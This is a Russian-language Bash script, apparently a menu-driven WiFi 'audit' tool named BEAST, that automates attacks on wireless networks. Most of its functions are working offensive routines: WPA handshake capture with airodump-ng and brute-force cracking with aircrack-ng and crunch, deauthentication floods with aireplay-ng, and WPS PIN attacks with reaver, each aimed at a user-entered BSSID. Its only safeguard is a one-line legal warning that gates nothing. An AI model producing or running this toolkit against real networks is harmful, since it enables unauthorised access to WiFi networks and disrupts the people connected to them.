#!/bin/bash
export LANG=en_US.UTF-8
exec 2>/dev/null
clear

ORANGE='\033[38;5;208m'
DORANGE='\033[38;5;202m'
LORANGE='\033[38;5;214m'
WHITE='\033[1;37m'
NC='\033[0m'
OS=$(uname)

print_banner() {
    echo -e "${ORANGE}"
    echo "██████╗ ███████╗ █████╗ ███████╗████████╗"
    echo "██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝"
    echo "██████╔╝█████╗  ███████║███████╗   ██║   "
    echo "██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║   "
    echo "██████╔╝███████╗██║  ██║███████║   ██║   "
    echo "╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   "
    echo -e "${DORANGE}═══════════════════════════════════════════${NC}"
    echo -e "${WHITE}     ПРОФЕССИОНАЛЬНЫЙ АУДИТ WiFi СЕТЕЙ${NC}"
    echo -e "${LORANGE}       v1.2 - Ultimate Edition 2025${NC}"
    echo -e "${WHITE}         Created by ${ORANGE}@misha_z88${NC}"
    echo -e "${DORANGE}═══════════════════════════════════════════${NC}\n"
}

loading_animation() {
    local pid=$1 delay=0.1
    local spinstr='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    while kill -0 $pid 2>/dev/null; do
        local temp=${spinstr#?}
        printf " ${ORANGE}[%c]${NC} " "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

print_status() {
    if [ "$2" == "ok" ]; then
        echo -e "${ORANGE}[✓]${NC} $1"
    else
        echo -e "${ORANGE}[!]${NC} $1"
    fi
}

install_dependencies() {
    echo -e "\n${ORANGE}УСТАНОВКА КОМПОНЕНТОВ${NC}"
    echo -e "${DORANGE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ "$OS" == "Darwin" ]; then
        if ! command -v brew &> /dev/null; then
            echo -e "${ORANGE}[?]${NC} Homebrew не найден. Установить Homebrew автоматически? (да/нет): "
            read install_brew
            if [ "$install_brew" = "да" ]; then
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
                if [ $? -ne 0 ]; then
                    print_status "Не удалось установить Homebrew. Установите его вручную." "error"
                    exit 1
                fi
            else
                print_status "Homebrew не установлен. Завершение работы." "error"
                exit 1
            fi
        fi
        brew update &> /dev/null
        INSTALL_CMD="brew install"
        tools=("aircrack-ng" "git" "curl")
    else
        if command -v apt &> /dev/null; then
            PKG_MANAGER="apt"
            sudo apt update &> /dev/null
            INSTALL_CMD="apt install -y"
        elif command -v pacman &> /dev/null; then
            PKG_MANAGER="pacman"
            INSTALL_CMD="pacman -S --noconfirm"
        else
            print_status "Пакетный менеджер не найден" "error"
            exit 1
        fi
        tools=("aircrack-ng" "wireless-tools" "net-tools" "iw" "iwlist" "airodump-ng" "aireplay-ng" "git" "curl")
    fi
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${ORANGE}➤${NC} Устанавливаем $tool..."
            sudo $INSTALL_CMD $tool &> /dev/null &
            loading_animation $!
            if command -v $tool &> /dev/null; then
                print_status "Установка $tool завершена" "ok"
            else
                print_status "Ошибка установки $tool" "error"
            fi
        else
            print_status "$tool уже установлен" "ok"
        fi
    done
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_status "Запустите скрипт с правами администратора (sudo)" "error"
        exit 1
    fi
    print_status "Права администратора подтверждены" "ok"
}

check_requirements() {
    if [ "$OS" == "Darwin" ]; then
        tools=("aircrack-ng" "git" "curl")
    else
        tools=("aircrack-ng" "iwconfig" "ifconfig" "iw" "iwlist" "airodump-ng" "aireplay-ng" "git" "curl")
    fi
    missing_tools=false
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools=true
            break
        fi
    done
    if [ "$missing_tools" = true ]; then
        print_status "Некоторые утилиты отсутствуют. Будет предпринята попытка их установки." "error"
        install_dependencies
    fi
    print_status "Все необходимые утилиты установлены" "ok"
}

legal_warning() {
    echo -e "\n${ORANGE}ВНИМАНИЕ:${NC} Это ПО предназначено для тестирования безопасности только на ваших сетях или с разрешения владельца."
    echo -ne "${ORANGE}[?]${NC} Нажмите Enter для продолжения..."
    read
}

setup_logging() {
    LOG_DIR="logs"
    mkdir -p "$LOG_DIR"
    LOG_FILE="$LOG_DIR/audit_$(date +%Y%m%d_%H%M%S).log"
    print_status "Логирование настроено: $LOG_FILE" "ok"
}

run_security_test() {
    echo -e "\n${ORANGE}Сканирование сетей...${NC}"
    if [ "$OS" == "Darwin" ]; then
        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s > "$LOG_FILE" 2>&1
    else
        iw dev > "$LOG_FILE" 2>&1
        iwlist scan >> "$LOG_FILE" 2>&1
    fi
    echo -e "\nРезультаты сканирования (отформатировано):"
    cat "$LOG_FILE" | column -t
    print_status "Сканирование завершено" "ok"
}

interactive_monitoring() {
    echo -e "\n${ORANGE}ИНТЕРАКТИВНЫЙ МОНИТОРИНГ СЕТЕЙ${NC}"
    echo -e "${DORANGE}Нажмите 'q' для выхода в меню${NC}"
    while true; do
        clear
        print_banner
        echo -e "${ORANGE}Сканирование сетей...${NC}\n"
        if [ "$OS" == "Darwin" ]; then
            /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | column -t
        else
            iwlist scan | column -t
        fi
        echo -e "\nНажмите 'q' для выхода или любую другую клавишу для обновления..."
        read -t 3 -n 1 key
        if [ "$key" = "q" ]; then
            break
        fi
    done
}

bruteforce_wifi() {
    echo -e "\n${ORANGE}BRUTEFORCE АТАКА WiFi${NC}"
    if [ "$OS" == "Darwin" ]; then
        echo -e "${ORANGE}[!]${NC} Bruteforce атака на macOS может работать нестабильно."
        sleep 2
    fi
    echo -ne "${ORANGE}[Ввод]${NC} Введите имя WiFi интерфейса (например, en0 или wlan0): "
    read mon_interface
    echo -ne "${ORANGE}[Ввод]${NC} Введите BSSID цели (например, AA:BB:CC:DD:EE:FF): "
    read target_bssid
    echo -ne "${ORANGE}[Ввод]${NC} Введите канал цели (например, 6): "
    read target_channel
    echo -ne "${ORANGE}[Ввод]${NC} Если у вас уже есть захваченный handshake файл, введите его путь, иначе оставьте пустым для захвата handshake: "
    read handshake_path
    echo -ne "${ORANGE}[Ввод]${NC} Введите путь к файлу словаря (оставьте пустым для генерации паролей на лету): "
    read wordlist
    echo -ne "${ORANGE}[Ввод]${NC} Введите время захвата handshake (в секундах, например, 60): "
    read capture_duration
    echo -ne "${ORANGE}[Ввод]${NC} Введите количество пакетов деаутентификаций (число пакетов для разрыва соединения, по умолчанию 10): "
    read deauth_count
    deauth_count=${deauth_count:-10}

    if [ -z "$handshake_path" ]; then
         echo -e "${ORANGE}Запуск airodump-ng для захвата handshake...${NC}"
         airodump-ng --bssid "$target_bssid" --channel "$target_channel" -w capture "$mon_interface" &
         airodump_pid=$!
         sleep "$capture_duration"
         kill $airodump_pid 2>/dev/null
         wait $airodump_pid 2>/dev/null
         capture_file=$(ls capture*.cap 2>/dev/null | head -n1)
         if [ -z "$capture_file" ]; then
             echo -e "${ORANGE}[!]${NC} Файл захвата не найден. Проверьте параметры и повторите попытку."
             return
         fi
    else
         capture_file="$handshake_path"
         if [ ! -f "$capture_file" ]; then
             echo -e "${ORANGE}[!]${NC} Указанный файл захвата не найден. Проверьте путь и повторите попытку."
             return
         fi
    fi

    CRUNCH_PID=""
    if [ -z "$wordlist" ]; then
         echo -e "${ORANGE}[INFO]${NC} Путь к словарю не указан. Будет сгенерирован потоковый словарь с помощью crunch."
         if ! command -v crunch &> /dev/null; then
             echo -e "${ORANGE}[!]${NC} crunch не установлен. Укажите путь к словарю или установите crunch."
             return
         fi
         TMP_FIFO=$(mktemp -u)
         mkfifo "$TMP_FIFO"
         crunch 8 8 abcdefgh1234567890 -q > "$TMP_FIFO" &
         CRUNCH_PID=$!
         wordlist="$TMP_FIFO"
    fi
    echo -e "${ORANGE}Запуск brute force атаки с подбором пароля...${NC}"
    result=$(aircrack-ng "$capture_file" -w "$wordlist")
    if [ -n "$CRUNCH_PID" ]; then
         kill $CRUNCH_PID 2>/dev/null
         rm -f "$TMP_FIFO"
    fi
    if echo "$result" | grep -q "KEY FOUND!"; then
         echo -e "${ORANGE}[✓]${NC} Пароль найден!"
         echo "$result" | grep "KEY FOUND!"
    else
         echo -e "${ORANGE}[!]${NC} Пароль не найден. Попробуйте снова."
    fi
}

deauth_attack() {
    echo -e "\n${ORANGE}DEAUTH АТАКА${NC}"
    if [ "$OS" == "Darwin" ]; then
        echo -e "${ORANGE}[!]${NC} Deauth атака на macOS может работать нестабильно."
        sleep 2
    fi
    echo -ne "${ORANGE}[Ввод]${NC} Введите имя WiFi интерфейса (например, en0 или wlan0): "
    read mon_interface
    echo -ne "${ORANGE}[Ввод]${NC} Введите BSSID цели (например, AA:BB:CC:DD:EE:FF): "
    read target_bssid
    echo -ne "${ORANGE}[Ввод]${NC} Введите количество пакетов деаутентификаций: "
    read deauth_count
    aireplay-ng --deauth "$deauth_count" -a "$target_bssid" "$mon_interface"
    print_status "Deauth атака завершена" "ok"
}

search_network_info() {
    echo -ne "\n${ORANGE}[Ввод]${NC} Введите MAC-адрес или его часть для поиска в логах: "
    read search_mac
    if [ -z "$LOG_FILE" ] || [ ! -f "$LOG_FILE" ]; then
        echo -e "${ORANGE}[!]${NC} Лог-файл не найден. Сначала выполните сканирование."
        return
    fi
    echo -e "\n${ORANGE}Найденные записи:${NC}"
    grep -i "$search_mac" "$LOG_FILE"
    exact_match=$(grep -i -E "([0-9a-f]{2}:){5}[0-9a-f]{2}" "$LOG_FILE" | grep -i "$search_mac" | head -n1)
    if [ ! -z "$exact_match" ]; then
        bssid=$(echo "$exact_match" | awk '{print $2}')
        echo -e "\n${ORANGE}Определяем производителя для MAC: $bssid${NC}"
        vendor=$(curl -s "https://api.macvendors.com/$bssid")
        if [ ! -z "$vendor" ]; then
            echo -e "${LORANGE}Производитель:${NC} $vendor"
        else
            echo -e "${ORANGE}[!]${NC} Не удалось получить информацию о производителе."
        fi
    fi
}

detailed_scan() {
    if [ -z "$LOG_FILE" ] || [ ! -f "$LOG_FILE" ]; then
         echo -e "${ORANGE}[!]${NC} Лог-файл не найден. Сначала выполните сканирование."
         return
    fi
    echo -e "\n${ORANGE}Детальная информация о сетях:${NC}"
    cat "$LOG_FILE" | column -t
}

wps_attack() {
    echo -e "\n${ORANGE}WPS АТАКА${NC}"
    if ! command -v reaver &> /dev/null; then
         echo -e "${ORANGE}[INFO]${NC} reaver не установлен. Попытка автоматической установки..."
         if [ "$OS" == "Darwin" ]; then
              brew install reaver
         else
              if command -v apt &> /dev/null; then
                  sudo apt install -y reaver
              elif command -v pacman &> /dev/null; then
                  sudo pacman -S --noconfirm reaver
              fi
         fi
         if ! command -v reaver &> /dev/null; then
              echo -e "${ORANGE}[!]${NC} Не удалось установить reaver. Повторите попытку вручную."
              return
         fi
    fi
    echo -ne "${ORANGE}[Ввод]${NC} Введите имя WiFi интерфейса (например, en0 или wlan0): "
    read mon_interface
    echo -ne "${ORANGE}[Ввод]${NC} Введите BSSID цели (например, AA:BB:CC:DD:EE:FF): "
    read target_bssid
    echo -ne "${ORANGE}[Ввод]${NC} Введите канал цели (например, 6): "
    read target_channel
    echo -e "${ORANGE}Запуск reaver для атаки WPS...${NC}"
    reaver -i "$mon_interface" -b "$target_bssid" -c "$target_channel" -vv
}

generate_report() {
    local report_file="report_$(date +%Y%m%d_%H%M%S).txt"
    {
        echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo -e "    ОТЧЕТ О ТЕСТИРОВАНИИ БЕЗОПАСНОСТИ"
        echo -e "    Created by @misha_z88"
        echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "Дата: $(date)"
        echo "Оператор: $USER"
        echo "Логи: $LOG_FILE"
        echo -e "\nНайденные сети:"
        cat "$LOG_FILE"
    } > "$report_file"
    print_status "Отчет создан: $report_file" "ok"
}

setup_audit_user() {
    echo -ne "\n${ORANGE}[Ввод]${NC} Создать нового пользователя для аудита? (да/нет): "
    read setup_user
    if [ "$setup_user" = "да" ]; then
        echo -ne "${ORANGE}[Ввод]${NC} Введите имя нового пользователя (по умолчанию: auditor): "
        read new_username
        new_username=${new_username:-auditor}
        if id "$new_username" &>/dev/null; then
            echo -e "${ORANGE}[!]${NC} Пользователь $new_username уже существует."
        else
            useradd -m -s /bin/zsh "$new_username"
            if [ $? -eq 0 ]; then
                echo "Пользователь $new_username создан. Установите пароль через 'passwd $new_username'."
            else
                echo -e "${ORANGE}[!]${NC} Ошибка при создании пользователя $new_username."
            fi
        fi
        user_home=$(eval echo "~$new_username")
        if [ ! -d "$user_home/.oh-my-zsh" ]; then
            echo "Устанавливаем oh-my-zsh для пользователя $new_username..."
            sudo -u "$new_username" sh -c 'RUNZSH=no CHSH=no KEEP_ZSHRC=yes sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"'
        else
            echo "oh-my-zsh уже установлен для пользователя $new_username."
        fi
        plugins_dir="$user_home/.oh-my-zsh/custom/plugins"
        sudo -u "$new_username" mkdir -p "$plugins_dir"
        if [ ! -d "$plugins_dir/zsh-autosuggestions" ]; then
            echo "Устанавливаем zsh-autosuggestions..."
            sudo -u "$new_username" git clone https://github.com/zsh-users/zsh-autosuggestions "$plugins_dir/zsh-autosuggestions"
        fi
        if [ ! -d "$plugins_dir/zsh-syntax-highlighting" ]; then
            echo "Устанавливаем zsh-syntax-highlighting..."
            sudo -u "$new_username" git clone https://github.com/zsh-users/zsh-syntax-highlighting.git "$plugins_dir/zsh-syntax-highlighting"
        fi
        if [ ! -d "$plugins_dir/zsh-autocomplete" ]; then
            echo "Устанавливаем zsh-autocomplete..."
            sudo -u "$new_username" git clone https://github.com/marlonrichert/zsh-autocomplete "$plugins_dir/zsh-autocomplete"
        fi
        echo -e "${ORANGE}[✓]${NC} Настройка пользователя $new_username завершена."
    fi
}

show_instructions() {
    echo -e "\n${ORANGE}Инструкции по использованию скрипта:${NC}"
    echo -e "${LORANGE}1) Однократное сканирование сетей:${NC} Запускает сканирование WiFi сетей и сохраняет результаты в лог-файл."
    echo -e "${LORANGE}2) Интерактивный мониторинг сетей:${NC} Отображает обновляемый список доступных сетей в табличном виде. Нажмите 'q' для возврата в меню."
    echo -e "${LORANGE}3) Bruteforce атака WiFi:${NC} Позволяет попытаться подобрать пароль к выбранной сети. Вы можете указать путь к существующему handshake-файлу или оставить поле пустым для автоматического захвата handshake. Если путь к словарю не указан, будет использован crunch для генерации паролей."
    echo -e "${LORANGE}4) Deauth атака:${NC} Отправляет заданное количество пакетов для разрыва соединения с целью принудительного переподключения клиентов."
    echo -e "${LORANGE}5) Сгенерировать отчет:${NC} Создает текстовый файл с результатами последнего сканирования."
    echo -e "${LORANGE}6) Создать пользователя для аудита:${NC} Автоматически создает нового пользователя с предустановленным oh-my-zsh для проведения аудита."
    echo -e "${LORANGE}7) Поиск информации по MAC адресу:${NC} Ищет в лог-файле информацию о сети по введенному MAC адресу или его части."
    echo -e "${LORANGE}8) Показать детальную информацию о сетях:${NC} Выводит содержимое лог-файла в удобном табличном формате."
    echo -e "${LORANGE}9) WPS атака:${NC} Запускает атаку WPS с использованием reaver. Если reaver отсутствует, скрипт попытается установить его автоматически."
    echo -e "${LORANGE}10) Инструкции:${NC} Показывает это сообщение с подробными описаниями всех функций."
    echo -e "${LORANGE}11) Выход:${NC} Завершает работу скрипта.\n"
    echo -ne "${ORANGE}[Нажмите Enter для возврата в меню]${NC}"
    read
}

main_menu() {
    while true; do
        echo -e "\n${ORANGE}МЕНЮ:${NC}"
        echo -e "${LORANGE}1) Однократное сканирование сетей${NC}"
        echo -e "${LORANGE}2) Интерактивный мониторинг сетей (нажмите 'q' для выхода)${NC}"
        echo -e "${LORANGE}3) Bruteforce атака WiFi${NC}"
        echo -e "${LORANGE}4) Deauth атака${NC}"
        echo -e "${LORANGE}5) Сгенерировать отчет${NC}"
        echo -e "${LORANGE}6) Создать пользователя для аудита${NC}"
        echo -e "${LORANGE}7) Поиск информации по MAC адресу${NC}"
        echo -e "${LORANGE}8) Показать детальную информацию о сетях${NC}"
        echo -e "${LORANGE}9) WPS атака${NC}"
        echo -e "${LORANGE}10) Инструкции${NC}"
        echo -e "${LORANGE}11) Выход${NC}"
        echo -ne "${ORANGE}[Ввод]${NC} Введите номер опции: "
        read option
        case $option in
            1) run_security_test ;;
            2) interactive_monitoring ;;
            3) bruteforce_wifi ;;
            4) deauth_attack ;;
            5) generate_report ;;
            6) setup_audit_user ;;
            7) search_network_info ;;
            8) detailed_scan ;;
            9) wps_attack ;;
            10) show_instructions ;;
            11) exit 0 ;;
            *) echo -e "${ORANGE}[!]${NC} Неверный выбор. Попробуйте снова." ;;
        esac
    done
}

cleanup() {
    echo -e "\n${ORANGE}ОЧИСТКА${NC}"
    echo -e "${DORANGE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    print_status "Очистка временных файлов завершена" "ok"
}
trap cleanup EXIT

main() {
    print_banner
    check_root
    check_requirements
    legal_warning
    setup_logging
    main_menu
}

main
